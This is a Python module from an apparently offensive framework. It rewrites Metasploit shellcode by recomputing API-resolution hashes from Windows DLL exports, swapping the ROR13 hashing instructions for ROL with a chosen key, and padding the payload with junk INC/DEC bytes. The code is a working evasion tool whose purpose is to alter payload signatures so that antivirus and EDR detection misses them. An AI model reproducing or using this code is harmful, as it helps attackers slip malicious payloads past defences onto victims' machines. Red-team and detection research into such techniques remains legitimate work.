########################################################
### ROLHash Module
### Status: migrated 085
### 
########################################################

import pefile
from os import path as ospath
#from utils.helper import nstate as nstate
from utils.style import *

CATEGORY    = 'obfuscate'
DESCRIPTION = 'Change ROR13 to ROL encoding in metasploit payloads'

arglist = {
   'input':       { 'value': None, 'desc': 'Input file for UUID encoding' },
   'output':      { 'value': None, 'desc': 'Outputfile for ROR13 to ROL conversion' },
   'key':         { 'value': 0, 'desc': 'Key to process ROR13 to ROL' }
}

def register_arguments(parser):
    parser.add_argument('-i', '--input', help=arglist['input']['desc'])
    parser.add_argument('-o', '--output', help=arglist['output']['desc'])
    parser.add_argument('-k', '--key', type=int, help=arglist['key']['desc'])

class module:
  Author = 'bordergate, psycore8'
  Version = '2.1.5'
  DisplayName = 'ROLLIN-HASH'
  data_size = 0
  hash = ''
  hash_dict = dict()
  dll_paths = [ 'C:\\Windows\\System32\\kernel32.dll', 
                'C:\\Windows\\System32\\ws2_32.dll', 
                'C:\\Windows\\System32\\wininet.dll', 
                'C:\\Windows\\System32\\dnsapi.dll',
                'C:\\Windows\\System32\\mswsock.dll'
             ]
  relay = False
  shell_path = '::obfuscate::rolhash'
  
  def __init__(self, input, output, key):
     self.input = input
     self.output = output
     self.key = key

  def msg(self, message_type, MsgVar=any, ErrorExit=False):
    messages = {
        'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
        'error.input'    : f'{s_fail} File {self.input} not found or cannot be opened.',
        'error.enc'      : f'{s_fail} En-/Decrption error, aborting script execution',
        'error.mode'     : f'{s_fail} Please provide a valid mode: encode / decode',
        'post.done'      : f'{s_ok} DONE!',
        'proc.input_ok'  : f'{s_ok} File {self.input} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
        'proc.out'       : f'{s_ok} File created in {self.output}\n{s_ok} Hash: {self.hash}',
        'proc.error'     : f'{s_fail} encoded Shellcode error, aborting script execution',
        'proc.done'      : f'{s_ok} encoded shellcode created in {self.output}',
        'proc.sizemod'   : f'{s_note} Shellcode size: {MsgVar}',
        'proc.out'       : f'{s_note} Writing bytes to file: {self.output}',
        'proc.input'     : f'{s_ok} Reading shellcode'
    }
    print(messages.get(message_type, f'{message_type} - this message type is unknown'))
    if ErrorExit:
        exit()

  def lookup_functions(self, dll_path):
    pe = pefile.PE(dll_path)
    export_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']]
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if exp.name:
        function_name = exp.name.decode()
        dll_name = ospath.basename(dll_path)
        hash = self.calculate_hash(dll_name, function_name, 13, "ror")
        self.hash_dict[hash] = dll_name + '!' + function_name
 
  def ror(self, dword, bits):
    return ((dword >> (bits%32)) | (dword << (32-(bits%32)))) & 0xffffffff
 
  def rol(self, dword, bits):
    return ((dword << (bits%32)) | (dword >> (32-(bits%32)))) & 0xffffffff
 
  def unicode(self, string, uppercase=True):
    result = ''
    if uppercase:
        string = string.upper()
    for c in string:
        result += c + '\x00'
    return result
 
  def calculate_hash(self, module, function, bits, hash_type):
    module_hash = 0
    function_hash = 0
    for c in self.unicode(module + '\x00'):
        if hash_type == "ror":
            module_hash = self.ror(module_hash, bits)
        if hash_type == "rol":
            module_hash = self.rol(module_hash, bits)
        module_hash += ord(c)
    for c in function + '\x00':
        if hash_type == "ror":
            function_hash = self.ror(function_hash, bits)
        if hash_type == "rol":
            function_hash = self.rol(function_hash, bits)
        function_hash += ord(c)
    hash = module_hash + function_hash & 0xFFFFFFFF
    return hash
 
  def check_shellcode(self, shellcode, pattern):
    byte_data = pattern.to_bytes(4, 'big')
    reversed_bytes = byte_data[::-1]
    index = shellcode.find(reversed_bytes)
    return index
 
  def replace_bytes_at_offset(self, data, offset, new_bytes):
    data = bytearray(data)
    end_offset = offset + len(new_bytes)
    data[offset:end_offset] = new_bytes
    return bytes(data)
 
  def highlight_byte_changes(self, original_bytes, modified_bytes):
    highlighted = []
    for original, modified in zip(original_bytes, modified_bytes):
        if original == modified:
            highlighted.append(f"\\x{original:02X}")
        else:
            highlighted.append(f"\\x{original:02X} -> \\x{modified:02X}")
    return "".join(highlighted)
 
  def find_ror_instructions(self, data, search_bytes):
    occurrences = []
    index = 0
    while True:
        try:
            index = data.index(search_bytes, index)
            occurrences.append(index)
            index += 1
        except ValueError:
            break
    return occurrences
 
  def process_shellcode(self, shellcode,ror_key):
    new_shellcode = shellcode
 
    for key,value in self.hash_dict.items():
        index = self.check_shellcode(shellcode, key)
        if index != -1:
            #self.msg('proc.func')
            print(f'{s_note} 0x%08X = %s offset: %s' % (key, value, index))
            dll_name = value.split('!')[0]
            function_name = value.split('!')[1]
            hash = self.calculate_hash(dll_name, function_name, ror_key, "rol")
            #self.msg('proc.newfunc')
            print(f'{s_ok} New value: 0x%08X' % (hash))
            byte_data = hash.to_bytes(4, 'big')
            reversed_bytes = byte_data[::-1]
            new_shellcode = self.replace_bytes_at_offset(new_shellcode, index, reversed_bytes)
            hex_string = ''.join('\\x{:02X}'.format(byte) for byte in new_shellcode)
 
    print(f"{s_note} Changing ROR key")
    
    # \xC1\xCF\x0D ror edi,D

    ror_instances = self.find_ror_instructions(new_shellcode,b"\xC1\xCF\x0D")
    for ror_offset in ror_instances:
        bytes_key = ror_key.to_bytes(1, 'big')
        # We're replacing the ROR with a ROL here. ROR = \xC1\xCF\x0D  ROL = \xC1\xC7\+byte_key
        new_shellcode = self.replace_bytes_at_offset(new_shellcode, ror_offset, b"\xC1\xC7" + bytes_key )
         
    return new_shellcode
  
  # def process(dll_paths, filename, out_file, showmod, decompile, ror_key):
  def process(self):
    m = self.msg
    m('pre.head')
    for dll in self.dll_paths:
      self.lookup_functions(dll)
    # Read existing shellcode
    m('proc.input')
    try: 
      with open(self.input, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
        m('error.input', None, True)
 
    new_shellcode = self.process_shellcode(shellcode,int(self.key))
 
    # Add some NOP's
    position = 1
    bytes_to_insert = b"\xFF\xC0\xFF\xC8" * 5  # INC EAX, DEC EAX
    modified_shellcode = new_shellcode[:position] + bytes_to_insert + new_shellcode[position:]
   
    m('proc.sizemod', len(modified_shellcode))
    if self.relay:
       m('proc.done')
       return modified_shellcode
    else:
      m('proc.out')
      with open(self.output, 'wb') as file:
        file.write(modified_shellcode)
      cf = ospath.isfile(self.output)
      if cf == True:
        m('proc.done')
      else:
        m('proc.error')
        exit()
      m('post.done')